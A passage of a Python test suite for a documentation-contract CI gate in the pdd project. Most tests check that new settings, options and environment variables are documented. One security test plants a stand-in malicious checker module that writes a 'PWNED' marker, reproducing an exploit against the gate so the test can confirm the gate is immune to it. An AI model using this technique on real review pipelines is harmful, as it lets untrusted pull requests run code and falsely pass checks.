        subprocess.run(["git", "add", "."], cwd=tmp_path, check=True)
        subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit", "-m", "add docs", "-q"], cwd=tmp_path, check=True)

        res = run_doc_contract_check(tmp_path, base_ref="HEAD")
        assert res == 0

    def test_run_doc_contract_check_detects_undocumented_pddrc_key(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import run_doc_contract_check

        _git_init(tmp_path)

        # Initial commit with files
        (tmp_path / "README.md").write_text("**Available Context Settings**:\n- `existing_key`\n", encoding="utf-8")
        (tmp_path / "pdd").mkdir(parents=True, exist_ok=True)
        (tmp_path / "pdd" / "construct_paths.py").write_text('_PDDRC_DEFAULTS_KEYS = {"existing_key"}\n', encoding="utf-8")

        subprocess.run(["git", "add", "."], cwd=tmp_path, check=True)
        subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit", "-m", "init docs", "-q"], cwd=tmp_path, check=True)

        # Modify to add a new key, undocumented in README
        (tmp_path / "pdd" / "construct_paths.py").write_text('_PDDRC_DEFAULTS_KEYS = {"existing_key", "undocumented_key"}\n', encoding="utf-8")

        # Should fail
        res = run_doc_contract_check(tmp_path, base_ref="HEAD~1")
        assert res == 1

        # Document it in README
        (tmp_path / "README.md").write_text("**Available Context Settings**:\n- `existing_key`\n- `undocumented_key`\n", encoding="utf-8")

        # Should now pass
        res = run_doc_contract_check(tmp_path, base_ref="HEAD~1")
        assert res == 0

    def test_run_doc_contract_check_detects_undocumented_click_option(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import run_doc_contract_check

        _git_init(tmp_path)

        (tmp_path / "README.md").write_text("# README\n", encoding="utf-8")
        (tmp_path / "cli.py").write_text("import click\n@click.command()\n", encoding="utf-8")

        subprocess.run(["git", "add", "."], cwd=tmp_path, check=True)
        subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit", "-m", "init cli", "-q"], cwd=tmp_path, check=True)

        # Add undocumented Click option
        (tmp_path / "cli.py").write_text("import click\n@click.command()\n@click.option('--new-opt')\n", encoding="utf-8")

        res = run_doc_contract_check(tmp_path, base_ref="HEAD~1")
        assert res == 1

        # Document it in README
        (tmp_path / "README.md").write_text("# README\n--new-opt is here\n", encoding="utf-8")

        res = run_doc_contract_check(tmp_path, base_ref="HEAD~1")
        assert res == 0

    def test_run_doc_contract_check_detects_undocumented_skip_behavior(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import run_doc_contract_check

        _git_init(tmp_path)

        (tmp_path / "README.md").write_text("# README\n", encoding="utf-8")
        (tmp_path / "pdd").mkdir(parents=True, exist_ok=True)
        (tmp_path / "pdd" / "prompts").mkdir(parents=True, exist_ok=True)
        (tmp_path / "pdd" / "prompts" / "sync_orchestration_python.prompt").write_text("## Workflow Operations\n", encoding="utf-8")
        (tmp_path / "user_stories").mkdir(parents=True, exist_ok=True)
        (tmp_path / "user_stories" / "story__sync_ops.md").write_text(
            "<!-- pdd-story-prompts: sync_orchestration_python.prompt -->\n\n"
            "As an operator, workflow operations stay documented.\n",
            encoding="utf-8",
        )
        (tmp_path / "sync.py").write_text("def run():\n    pass\n", encoding="utf-8")

        subprocess.run(["git", "add", "."], cwd=tmp_path, check=True)
        subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit", "-m", "init sync", "-q"], cwd=tmp_path, check=True)

        # Add undocumented skip behavior in code
        (tmp_path / "sync.py").write_text("def run():\n    if operation == 'skip:new_op':\n        pass\n", encoding="utf-8")

        # Fails because undocumented in both README and prompts
        res = run_doc_contract_check(tmp_path, base_ref="HEAD~1")
        assert res == 1

        # Document in README but not in prompts -> still fails
        (tmp_path / "README.md").write_text("# README\nnew_op\n", encoding="utf-8")
        res = run_doc_contract_check(tmp_path, base_ref="HEAD~1")
        assert res == 1

        # Document in prompts but not in README -> still fails
        (tmp_path / "README.md").write_text("# README\n", encoding="utf-8")
        (tmp_path / "pdd" / "prompts" / "sync_orchestration_python.prompt").write_text("## Workflow Operations\nnew_op\n", encoding="utf-8")
        res = run_doc_contract_check(tmp_path, base_ref="HEAD~1")
        assert res == 1

        # Document in both -> passes
        (tmp_path / "README.md").write_text("# README\nnew_op\n", encoding="utf-8")
        (tmp_path / "pdd" / "prompts" / "sync_orchestration_python.prompt").write_text("## Workflow Operations\nnew_op\n", encoding="utf-8")
        res = run_doc_contract_check(tmp_path, base_ref="HEAD~1")
        assert res == 0

    def test_run_doc_contract_check_detects_undocumented_env_var(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import run_doc_contract_check

        _git_init(tmp_path)

        (tmp_path / "README.md").write_text(
            "### Environment Variables\n\n#### Core Environment Variables\n",
            encoding="utf-8",
        )
        (tmp_path / "helper.py").write_text("def run():\n    pass\n", encoding="utf-8")

        subprocess.run(["git", "add", "."], cwd=tmp_path, check=True)
        subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit", "-m", "init helper", "-q"], cwd=tmp_path, check=True)

        # Add undocumented PDD_* env var
        (tmp_path / "helper.py").write_text("def run():\n    os.environ.get('PDD_MY_NEW_VAR')\n", encoding="utf-8")

        res = run_doc_contract_check(tmp_path, base_ref="HEAD~1")
        assert res == 1

        # Document it in README
        (tmp_path / "README.md").write_text(
            "### Environment Variables\n\n#### Core Environment Variables\n- `PDD_MY_NEW_VAR` is here\n",
            encoding="utf-8",
        )

        res = run_doc_contract_check(tmp_path, base_ref="HEAD~1")
        assert res == 0

    def test_prompt_change_without_story_coverage_passes(self, tmp_path: Path) -> None:
        """Issue #1447: a changed non-LLM ``.prompt`` file must NOT fail the
        doc-contract gate merely because no ``user_stories/story__*.md`` covers
        it.

        The prompt-story coverage requirement (the #560 bridge) predated the
        prompt-checkup/story product path and was removed from the deterministic
        gate. Other doc-contract checks still apply; only the story-coverage
        obligation is gone. Future prompt-checkup work (#1425) owns story
        enforcement behind product-ready warn|strict|off controls.
        """
        from pdd.checkup_gates import run_doc_contract_check

        _git_init(tmp_path)
        prompts_dir = tmp_path / "prompts"
        prompts_dir.mkdir(parents=True, exist_ok=True)
        prompt = prompts_dir / "billing_python.prompt"
        prompt.write_text("Generate billing code.\n", encoding="utf-8")
        subprocess.run(["git", "add", "."], cwd=tmp_path, check=True)
        subprocess.run(
            ["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit", "-m", "base prompt", "-q"],
            cwd=tmp_path,
            check=True,
        )

        prompt.write_text(
            "Generate billing code.\nSupport subscription cancellation.\n",
            encoding="utf-8",
        )
        subprocess.run(["git", "add", "."], cwd=tmp_path, check=True)
        subprocess.run(
            ["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit", "-m", "change prompt", "-q"],
            cwd=tmp_path,
            check=True,
        )

        # No ``user_stories/`` coverage exists; the prompt-only change must pass.
        assert run_doc_contract_check(tmp_path, base_ref="HEAD~1") == 0

    def test_repo_declared_doc_contract_supports_non_pdd_repo_surfaces(self, tmp_path: Path) -> None:
        """A non-PDD repository can declare its own user-facing surfaces and docs.

        This pins the holistic interface: the gate is not limited to PDD's
        `.pddrc`, `PDD_*`, Click, README, or prompt conventions.
        """
        from pdd.checkup_gates import run_doc_contract_check

        _git_init(tmp_path)
        (tmp_path / ".pdd").mkdir(parents=True, exist_ok=True)
        (tmp_path / "docs").mkdir(parents=True, exist_ok=True)
        (tmp_path / "src").mkdir(parents=True, exist_ok=True)
        (tmp_path / ".pdd" / "doc_contract.json").write_text(
            json.dumps(
                {
                    "version": 1,
                    "rules": [
                        {
                            "name": "application env vars",
                            "source_globs": ["src/*.py"],
                            "added_regex": r"\b(APP_[A-Z0-9_]+)\b",
                            "docs": [
                                {
                                    "path": "docs/configuration.md",
                                    "section_start": "## Environment",
                                    "section_end_markers": ["## "],
                                }
                            ],
                        }
                    ],
                }
            ),
            encoding="utf-8",
        )
        (tmp_path / "docs" / "configuration.md").write_text(
            "# Config\n## Environment\n- `APP_EXISTING` is documented.\n",
            encoding="utf-8",
        )
        (tmp_path / "src" / "service.py").write_text(
            "import os\nVALUE = os.environ.get('APP_EXISTING')\n",
            encoding="utf-8",
        )
        subprocess.run(["git", "add", "."], cwd=tmp_path, check=True)
        subprocess.run(
            ["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit", "-m", "contract", "-q"],
            cwd=tmp_path,
            check=True,
        )

        (tmp_path / "src" / "service.py").write_text(
            "import os\nVALUE = os.environ.get('APP_BILLING_TOKEN')\n",
            encoding="utf-8",
        )
        subprocess.run(["git", "add", "."], cwd=tmp_path, check=True)
        subprocess.run(
            ["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit", "-m", "add env", "-q"],
            cwd=tmp_path,
            check=True,
        )
        assert run_doc_contract_check(tmp_path, base_ref="HEAD~1") == 1

        (tmp_path / "docs" / "configuration.md").write_text(
            "# Config\n## Environment\n- `APP_BILLING_TOKEN` is documented.\n",
            encoding="utf-8",
        )
        subprocess.run(["git", "add", "."], cwd=tmp_path, check=True)
        subprocess.run(
            ["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit", "-m", "document env", "-q"],
            cwd=tmp_path,
            check=True,
        )
        assert run_doc_contract_check(tmp_path, base_ref="HEAD~2") == 0

    def test_repo_declared_doc_contract_uses_base_config_not_pr_weakened_config(self, tmp_path: Path) -> None:
        """A PR cannot bypass repo-declared docs by weakening its own config."""
        from pdd.checkup_gates import run_doc_contract_check

        _git_init(tmp_path)
        (tmp_path / ".pdd").mkdir(parents=True, exist_ok=True)
        (tmp_path / "docs").mkdir(parents=True, exist_ok=True)
        (tmp_path / "src").mkdir(parents=True, exist_ok=True)
        base_config = {
            "version": 1,
            "rules": [
                {
                    "name": "application env vars",
                    "source_globs": ["src/*.py"],
                    "added_regex": r"\b(APP_[A-Z0-9_]+)\b",
                    "docs": ["docs/configuration.md"],
                }
            ],
        }
        (tmp_path / ".pdd" / "doc_contract.json").write_text(
            json.dumps(base_config), encoding="utf-8"
        )
        (tmp_path / "docs" / "configuration.md").write_text(
            "# Config\n", encoding="utf-8"
        )
        (tmp_path / "src" / "service.py").write_text(
            "VALUE = None\n", encoding="utf-8"
        )
        subprocess.run(["git", "add", "."], cwd=tmp_path, check=True)
        subprocess.run(
            ["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit", "-m", "base contract", "-q"],
            cwd=tmp_path,
            check=True,
        )

        weakened_config = {
            "version": 1,
            "rules": [
                {
                    "name": "application env vars",
                    "source_globs": ["never/*.py"],
                    "added_regex": r"\b(APP_[A-Z0-9_]+)\b",
                    "docs": ["docs/configuration.md"],
                }
            ],
        }
        (tmp_path / ".pdd" / "doc_contract.json").write_text(
            json.dumps(weakened_config), encoding="utf-8"
        )
        (tmp_path / "src" / "service.py").write_text(
            "import os\nVALUE = os.environ.get('APP_SECRET_KEY')\n",
            encoding="utf-8",
        )

        subprocess.run(["git", "add", "."], cwd=tmp_path, check=True)
        subprocess.run(
            ["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit", "-m", "weaken config and add env", "-q"],
            cwd=tmp_path,
            check=True,
        )
        assert run_doc_contract_check(tmp_path, base_ref="HEAD~1") == 1

        (tmp_path / "docs" / "configuration.md").write_text(
            "# Config\n- `APP_SECRET_KEY` is documented.\n", encoding="utf-8"
        )
        subprocess.run(["git", "add", "."], cwd=tmp_path, check=True)
        subprocess.run(
            ["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit", "-m", "document env", "-q"],
            cwd=tmp_path,
            check=True,
        )
        assert run_doc_contract_check(tmp_path, base_ref="HEAD~2") == 0

    def test_repo_declared_doc_contract_preserves_distinct_multi_capture_surfaces(
        self, tmp_path: Path
    ) -> None:
        """Two surfaces that share their first capture must both be checked.

        Regression for #1309 review: a rule with multiple captures (here
        ``category`` and ``name``) can emit distinct obligations that share the
        first capture group. Keying obligations on that first capture alone
        collapses them, so a second documented surface silently overwrites an
        undocumented first one and the gate fails open.
        """
        from pdd.checkup_gates import run_doc_contract_check

        _git_init(tmp_path)
        (tmp_path / ".pdd").mkdir(parents=True, exist_ok=True)
        (tmp_path / "docs").mkdir(parents=True, exist_ok=True)
        (tmp_path / "src").mkdir(parents=True, exist_ok=True)
        (tmp_path / ".pdd" / "doc_contract.json").write_text(
            json.dumps(
                {
                    "version": 1,
                    "rules": [
                        {
                            "name": "features",
                            "source_globs": ["src/*.txt"],
                            "added_regex": (
                                r"FEATURE\('(?P<category>[a-z]+)',\s*"
                                r"'(?P<name>[A-Z_]+)'\)"
                            ),
                            "doc_regex": "{category}.*{name}",
                            "docs": ["docs/features.md"],
                        }
                    ],
                }
            ),
            encoding="utf-8",
        )
        (tmp_path / "docs" / "features.md").write_text(
            "# Features\n", encoding="utf-8"
        )
        (tmp_path / "src" / "features.txt").write_text("", encoding="utf-8")
        subprocess.run(["git", "add", "."], cwd=tmp_path, check=True)
        subprocess.run(
            ["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit", "-m", "base", "-q"],
            cwd=tmp_path,
            check=True,
        )

        # Add two surfaces sharing the first capture ("billing"); document only
        # the second one ("BETA"). The first ("ALPHA") is undocumented.
        (tmp_path / "src" / "features.txt").write_text(
            "FEATURE('billing', 'ALPHA')\nFEATURE('billing', 'BETA')\n",
            encoding="utf-8",
        )
        (tmp_path / "docs" / "features.md").write_text(
            "# Features\n- billing BETA is documented.\n", encoding="utf-8"
        )
        subprocess.run(["git", "add", "."], cwd=tmp_path, check=True)
        subprocess.run(
            ["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit", "-m", "add features", "-q"],
            cwd=tmp_path,
            check=True,
        )
        assert run_doc_contract_check(tmp_path, base_ref="HEAD~1") == 1

        # Documenting the previously-collapsed surface clears the gate.
        (tmp_path / "docs" / "features.md").write_text(
            "# Features\n- billing ALPHA is documented.\n- billing BETA is documented.\n",
            encoding="utf-8",
        )
        subprocess.run(["git", "add", "."], cwd=tmp_path, check=True)
        subprocess.run(
            ["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit", "-m", "document alpha", "-q"],
            cwd=tmp_path,
            check=True,
        )
        assert run_doc_contract_check(tmp_path, base_ref="HEAD~2") == 0

    def test_run_doc_contract_check_ignores_test_fixture_literals(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import run_doc_contract_check

        _git_init(tmp_path)

        (tmp_path / "README.md").write_text("# README\n", encoding="utf-8")
        (tmp_path / "tests").mkdir(parents=True, exist_ok=True)
        (tmp_path / "tests" / "test_doc_contract.py").write_text(
            "def test_existing():\n    assert True\n",
            encoding="utf-8",
        )

        subprocess.run(["git", "add", "."], cwd=tmp_path, check=True)
        subprocess.run(
            [
                "git",
                "-c",
                "user.name=t",
                "-c",
                "user.email=t@x",
                "commit",
                "-m",
                "init tests",
                "-q",
            ],
            cwd=tmp_path,
            check=True,
        )

        (tmp_path / "tests" / "test_doc_contract.py").write_text(
            "import click\n"
            "def test_fixture_literals():\n"
            "    click.option('--new-opt')\n"
            "    operation = 'skip:new_op'\n"
            "    env = 'PDD_MY_NEW_VAR'\n"
            "    assert operation and env\n",
            encoding="utf-8",
        )

        res = run_doc_contract_check(tmp_path, base_ref="HEAD~1")
        assert res == 0

    def test_doc_contract_cmd_runs_isolated(self, tmp_path: Path) -> None:
        """Security (issue #1303 review): the gate must invoke trusted code,
        so its command runs the interpreter in isolated mode (``-I``) and the
        snippet scrubs the worktree from ``sys.path``."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        gate = next(
            g
            for g in discover_gates(tmp_path, changed_files=())
            if g.name == "doc-contract"
        )
        assert "-I" in gate.cmd, "doc-contract must run python in isolated mode"
        snippet = next(part for part in gate.cmd if "run_doc_contract_check" in part)
        # The snippet removes worktree-resolving entries from sys.path before importing pdd.
        assert "sys.path" in snippet
        assert "realpath" in snippet
        # The final arg is the TRUSTED package root (parent of the running
        # `pdd` package), so the child imports the base checker, not the
        # worktree copy — and the gate stays functional off site-packages.
        import pdd as _pdd

        trusted_root = Path(_pdd.__file__).resolve().parent.parent
        assert gate.cmd[-1] == str(trusted_root)
        assert (trusted_root / "pdd").is_dir()

    def test_doc_contract_does_not_execute_worktree_pdd(self, tmp_path: Path) -> None:
        """Security (issue #1303 review): a PR-controlled ``pdd/checkup_gates.py``
        inside the reviewed worktree must NOT be imported/executed when the gate
        runs with ``cwd=worktree``. Reproduces the reported exploit: a malicious
        copy that writes a marker and returns 0. Runs the EXACT command
        ``discover_gates`` builds and asserts (a) the marker is never written and
        (b) the TRUSTED checker actually ran (so the gate stays functional)."""
        from pdd.checkup_gates import discover_gates

        marker = tmp_path / "PWNED"
        # Plant a malicious pdd package in the reviewed worktree.
        pkg = tmp_path / "pdd"
        pkg.mkdir()
        (pkg / "__init__.py").write_text("", encoding="utf-8")
        (pkg / "checkup_gates.py").write_text(
            "from pathlib import Path\n"
            "def run_doc_contract_check(*a, **k):\n"
            f"    Path(r'{marker}').write_text('pwned')\n"
            "    return 0\n",
            encoding="utf-8",
        )
        # Minimal docs so the TRUSTED gate has a clean, no-added-surface diff.
        (tmp_path / "README.md").write_text("# README\n", encoding="utf-8")
        (pkg / "prompts").mkdir()
        (pkg / "prompts" / "sync_orchestration_python.prompt").write_text("", encoding="utf-8")
        (pkg / "construct_paths.py").write_text("_PDDRC_DEFAULTS_KEYS = set()\n", encoding="utf-8")
        _git_init(tmp_path)
        subprocess.run(["git", "add", "."], cwd=tmp_path, check=True)
        subprocess.run(
            ["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit", "-m", "plant", "-q"],
            cwd=tmp_path,
            check=True,
        )

        gate = next(
            g
            for g in discover_gates(tmp_path, changed_files=(), base_ref="HEAD")
            if g.name == "doc-contract"
        )
        # Execute exactly as run_gates would: cwd set to the reviewed worktree.
        proc = subprocess.run(
            gate.cmd, cwd=str(tmp_path), capture_output=True, text=True
        )

        # (a) The PR-controlled module must never have run.
        assert not marker.exists(), (
            f"PR-controlled pdd/checkup_gates.py was executed! "
            f"stdout={proc.stdout!r} stderr={proc.stderr!r}"
        )
        # (b) The trusted checker ran to completion and produced a real verdict
        # (not an import error), proving the gate stays functional.
        assert proc.returncode == 0, (
            f"trusted gate did not run cleanly: rc={proc.returncode} "
            f"stdout={proc.stdout!r} stderr={proc.stderr!r}"
        )
        assert "Doc Contract Check" in proc.stdout

    def test_detects_new_skip_condition_on_existing_operation(self, tmp_path: Path) -> None:
        """Issue #1303/#1238 regression: adding a NEW skip condition to an
        EXISTING operation (e.g. `operation == 'fix' and skip_tests`) must be
        caught. Documenting only the operation name is not sufficient — the
        skip CONDITION must be documented in BOTH README and the sync
        orchestration prompt."""
        from pdd.checkup_gates import run_doc_contract_check

        _git_init(tmp_path)
        (tmp_path / "pdd").mkdir(parents=True, exist_ok=True)
        (tmp_path / "pdd" / "prompts").mkdir(parents=True, exist_ok=True)
        (tmp_path / "user_stories").mkdir(parents=True, exist_ok=True)
        (tmp_path / "user_stories" / "story__sync_ops.md").write_text(
            "<!-- pdd-story-prompts: sync_orchestration_python.prompt -->\n\n"
            "As an operator, workflow operation skip contracts stay documented.\n",
            encoding="utf-8",
        )
        # The operation 'fix' is already fully documented; only the new skip
        # condition is missing — exactly the drift the old name-only check missed.
        (tmp_path / "README.md").write_text(
            "# README\n## Workflow\n- fix: Resolve test failures\n", encoding="utf-8"
        )
        (tmp_path / "pdd" / "prompts" / "sync_orchestration_python.prompt").write_text(
            "## Workflow Operations\n- fix: resolve failing tests\n", encoding="utf-8"
        )
        (tmp_path / "sync.py").write_text(
            "def run(operation):\n    return operation == 'fix'\n", encoding="utf-8"
        )
        subprocess.run(["git", "add", "."], cwd=tmp_path, check=True)
        subprocess.run(
            ["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit", "-m", "init", "-q"],
            cwd=tmp_path,
            check=True,
        )

        # Add a skip condition gating the existing 'fix' operation.
        (tmp_path / "sync.py").write_text(
            "def run(operation, skip_tests):\n"
            "    if operation == 'fix' and skip_tests:\n"
            "        return 'skip'\n"
            "    return operation == 'fix'\n",
            encoding="utf-8",
        )
        # Operation 'fix' is documented, but the skip_tests condition is not →
        # must fail (the old name-only check would have passed here).
        assert run_doc_contract_check(tmp_path, base_ref="HEAD~1") == 1

        # Document the condition in README only → still fails (prompt missing).
        (tmp_path / "README.md").write_text(
            "# README\n## Workflow\n- fix: Resolve test failures; skipped with --skip-tests\n",
            encoding="utf-8",
        )
        assert run_doc_contract_check(tmp_path, base_ref="HEAD~1") == 1

        # Document the condition in BOTH README and the prompt → passes.
        (tmp_path / "pdd" / "prompts" / "sync_orchestration_python.prompt").write_text(
            "## Workflow Operations\n- fix: resolve failing tests; skipped under --skip-tests\n",
            encoding="utf-8",
        )
        assert run_doc_contract_check(tmp_path, base_ref="HEAD~1") == 0

    def test_skip_condition_must_be_tied_to_the_operation_not_just_present(self, tmp_path: Path) -> None:
        """Issue #1303/#1238 review round 2: the skip condition must be documented
        in the CONTRACT FOR THE SPECIFIC OPERATION, not merely anywhere in the
        file. The original drift was docs that already mention `--skip-tests`
        (for the `test` step) while the `fix` step contract stayed unconditional.
        That must still fail; only tying `--skip-tests`/`skip_tests` to `fix`'s own
        entry passes."""
        from pdd.checkup_gates import run_doc_contract_check

        _git_init(tmp_path)
        (tmp_path / "pdd").mkdir(parents=True, exist_ok=True)
        (tmp_path / "pdd" / "prompts").mkdir(parents=True, exist_ok=True)
        (tmp_path / "user_stories").mkdir(parents=True, exist_ok=True)
        (tmp_path / "user_stories" / "story__sync_ops.md").write_text(
            "<!-- pdd-story-prompts: sync_orchestration_python.prompt -->\n\n"
            "As an operator, workflow operation skip contracts stay scoped.\n",
            encoding="utf-8",
        )

        # --skip-tests is documented globally + for the TEST step, but `fix` is
        # documented as an unconditional "Resolve test failures" (the drift).
        (tmp_path / "README.md").write_text(
            "# README\n## Options\n- `--skip-tests`: skip the test step\n"
            "## Workflow\n"
            "- test: run tests (skipped with --skip-tests)\n"
            "- fix: Resolve test failures\n",
            encoding="utf-8",
        )
        (tmp_path / "pdd" / "prompts" / "sync_orchestration_python.prompt").write_text(
            "## Workflow Operations\n"
            "- test: run tests; skipped when skip_tests is set\n"
            "- fix: resolve failing tests\n"
            "### Signature\nskip_tests: bool = False\n",
            encoding="utf-8",
        )
        (tmp_path / "sync.py").write_text(
            "def run(operation):\n    return operation == 'fix'\n", encoding="utf-8"
        )
        subprocess.run(["git", "add", "."], cwd=tmp_path, check=True)
        subprocess.run(
            ["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit", "-m", "init", "-q"],
            cwd=tmp_path,
            check=True,
        )

        # New skip condition added to the EXISTING `fix` operation.
        (tmp_path / "sync.py").write_text(
            "def run(operation, skip_tests):\n"
            "    if operation == 'fix' and skip_tests:\n"
            "        return 'skip'\n"
            "    return operation == 'fix'\n",
            encoding="utf-8",
        )
        # --skip-tests is present in both files, but only for `test` — `fix`'s own
        # contract is silent. Must fail (the file-wide check wrongly passed here).
        assert run_doc_contract_check(tmp_path, base_ref="HEAD~1") == 1

        # Tie the condition to `fix`'s OWN entry in both docs → passes.
        (tmp_path / "README.md").write_text(
            "# README\n## Options\n- `--skip-tests`: skip the test step\n"
            "## Workflow\n"
            "- test: run tests (skipped with --skip-tests)\n"
            "- fix: Resolve test failures; skipped when --skip-tests is set\n",
            encoding="utf-8",
        )
        (tmp_path / "pdd" / "prompts" / "sync_orchestration_python.prompt").write_text(
            "## Workflow Operations\n"
            "- test: run tests; skipped when skip_tests is set\n"
            "- fix: resolve failing tests; skipped when skip_tests is set\n"
            "### Signature\nskip_tests: bool = False\n",
            encoding="utf-8",
        )
        assert run_doc_contract_check(tmp_path, base_ref="HEAD~1") == 0


class TestExtractPddrcDefaultsKeys:
    """Direct unit tests for extract_pddrc_defaults_keys (AST-based parser)."""

    def test_single_line_set_literal(self):
        from pdd.checkup_gates import extract_pddrc_defaults_keys
        content = '_PDDRC_DEFAULTS_KEYS = {"a", "b", "c"}\n'
        assert extract_pddrc_defaults_keys(content) == {"a", "b", "c"}

    def test_multiline_set_literal(self):
        from pdd.checkup_gates import extract_pddrc_defaults_keys
        content = 'x = 1\n_PDDRC_DEFAULTS_KEYS = {\n    "key_a",\n    "key_b",\n}\n'
        assert extract_pddrc_defaults_keys(content) == {"key_a", "key_b"}

    def test_comment_with_closing_brace_inside_literal(self):
        # This is the case the old regex silently failed on
        from pdd.checkup_gates import extract_pddrc_defaults_keys
        content = '_PDDRC_DEFAULTS_KEYS = {\n    "key_a",  # e.g. {default}\n    "key_b",\n}\n'
        assert extract_pddrc_defaults_keys(content) == {"key_a", "key_b"}

    def test_missing_assignment_returns_empty(self):
        from pdd.checkup_gates import extract_pddrc_defaults_keys
        assert extract_pddrc_defaults_keys("x = 1\n") == set()

    def test_syntax_error_returns_empty(self):
        from pdd.checkup_gates import extract_pddrc_defaults_keys
        assert extract_pddrc_defaults_keys("def (broken syntax") == set()
